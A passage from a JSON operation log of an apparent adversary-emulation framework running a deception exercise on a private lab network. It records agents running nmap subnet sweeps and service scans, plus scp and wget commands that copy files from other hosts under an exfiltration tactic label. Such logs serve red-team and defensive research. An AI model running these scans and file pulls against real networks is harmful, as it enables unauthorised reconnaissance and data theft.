#{host.data.user}@#{host.data.ip}:#{host.data.filepath} #{host.data.dst-filepath}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-exfiltration"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.data.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.data.user}@#{host.data.ip}:#{host.data.filepath} #{host.data.dst-filepath}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:45Z"}, {"id": "ead04b38-ce38-4629-b46b-e97f23400272", "paw": "rezmky", "command": "wget http://192.168.200.5:8080/data2.json", "plaintext_command": "wget http://192.168.200.5:8080/data2.json", "status": 0, "score": 1, "decide": "2024-04-26T23:46:47Z", "pin": 0, "pid": "1782", "facts": [], "relationships": [], "used": [{"unique": "host.data.urlhttp://192.168.200.5:8080/data2.json", "trait": "host.data.url", "name": "host.data.url", "value": "http://192.168.200.5:8080/data2.json", "created": "2024-04-26T23:46:47Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": null}], "unique": "ead04b38-ce38-4629-b46b-e97f23400272", "collect": "2024-04-26T23:46:49Z", "finish": "2024-04-26T23:46:49Z", "ability": {"ability_id": "deception-wget-copy", "tactic": "deception-data-exfiltration", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Copy file using wget", "description": "Copy file using wget", "executors": [{"name": "sh", "platform": "linux", "command": "wget #{host.data.url}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-exfiltration"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "wget #{host.data.url}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:46:49Z"}, {"id": "82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "paw": "rezmky", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "plaintext_command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "status": 0, "score": 0, "decide": "2024-04-26T23:46:52Z", "pin": 0, "pid": "1784", "facts": [{"unique": "results.data.filenamedata2.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data2.json", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "eb02a9a0-52fc-42d1-aff2-bee458d17d90"], "relationships": ["results.data.filename(data2.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T9012"}, {"unique": "results.data.hashc112f813cd2e4cd83b884f7c1f844f13", "trait": "results.data.hash", "name": "results.data.hash", "value": "c112f813cd2e4cd83b884f7c1f844f13", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "eb02a9a0-52fc-42d1-aff2-bee458d17d90"], "relationships": ["results.data.filename(data2.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)", "results.data.filename(data1.json) : has_hash : results.data.hash(c112f813cd2e4cd83b884f7c1f844f13)"], "limit_count": -1, "collected_by": ["rezmky"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b2920>has_hash<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46b27a0>", "source": {"unique": "results.data.filenamedata2.json", "trait": "results.data.filename", "name": "results.data.filename", "value": "data2.json", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_hash", "target": {"unique": "results.data.hashc112f813cd2e4cd83b884f7c1f844f13", "trait": "results.data.hash", "name": "results.data.hash", "value": "c112f813cd2e4cd83b884f7c1f844f13", "created": "2024-04-26T23:47:01Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [], "unique": "82d2e0ff-63d9-44ab-a952-a07a886ea7d2", "collect": "2024-04-26T23:47:01Z", "finish": "2024-04-26T23:47:01Z", "ability": {"ability_id": "deception-exfil-results", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Records exfil results", "description": "Records exfil results", "executors": [{"name": "sh", "platform": "linux", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.md5sum", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "find ~/ -maxdepth 1 -type f -exec md5sum {} +", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.md5sum", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "attacker", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:01Z"}, {"id": "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "paw": "etrrtg", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:47:02Z", "pin": 0, "pid": "1224", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479d060>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf479ee30>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:47:14Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs[]", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": [], "created": "2024-04-26T23:47:14Z", "score": 1, "source": null, "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:47:02Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "collect": "2024-04-26T23:47:03Z", "finish": "2024-04-26T23:47:14Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:03Z"}, {"id": "56bc1feb-a57e-470e-837b-9173b738d06d", "paw": "etrrtg", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:47:17Z", "pin": 0, "pid": "1226", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:47:20Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["56bc1feb-a57e-470e-837b-9173b738d06d"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["etrrtg"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46dd1e0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46dffd0>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:47:20Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:47:20Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:47:17Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "56bc1feb-a57e-470e-837b-9173b738d06d", "collect": "2024-04-26T23:47:17Z", "finish": "2024-04-26T23:47:20Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:17Z"}, {"id": "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "paw": "etrrtg", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:47:22Z", "pin": 0, "pid": "1228", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4988760>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf498a200>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:47:22Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "collect": "2024-04-26T23:47:25Z", "finish": "2024-04-26T23:47:28Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "database-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:25Z"}, {"id": "8298a844-4082-4e7f-ac12-669a6fd9deef", "paw": "etrrtg", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5", "status": 0, "score": 1, "decide": "2024-04-26T23:47:32Z", "pin": 0, "pid": "1230", "facts": [{"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ports['22', '8080']", "trait": "host.remote.ports", "name": "host.remote.ports", "value": ["22", "8080"], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.82) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.201.90) : has_open_ports : host.remote.ports(['22', '8080'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.4", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.4", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.ip192.168.200.5", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.5", "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '8080'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}, {"unique": "host.remote.port_services[('22', 'ssh'), ('8080', 'http')]", "trait": "host.remote.port_services", "name": "host.remote.port_services", "value": [["22", "ssh"], ["8080", "http"]], "created": "2024-04-26T23:40:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["0a760943-eea8-426d-99d8-7b4784ee2f9e", "53bf0731-495b-4303-9cbe-b0d368ccf7f2", "2b1fabfa-9182-4ea9-a36f-292c66f135c5", "e2a60de4-663d-4dad-b657-af3daac84a15", "797b6935-d781-4c85-9519-9bb5b3cfe0be", "8298a844-4082-4e7f-ac12-669a6fd9deef", "7e5ca019-19a9-4aae-986e-8aed3805f52a", "d5772356-d08e-464a-a83e-8322f6784854", "75bed3c0-a10f-419c-bb81-24ec4e400d57", "7fe6f7f9-11b5-4d5a-aa5f-1b5375b30084"], "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.82) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])", "host.remote.ip(192.168.201.90) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8080', 'http')])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.004"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4994940>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4994bb0>", "source": {"unique": "host.remote.ip192.168.200.3", "trait": "host.remote.ip", "name": "host.remote.ip", "value": "192.168.200.3", "created": "2024-04-26T23:47:40Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_open_ports", "target": 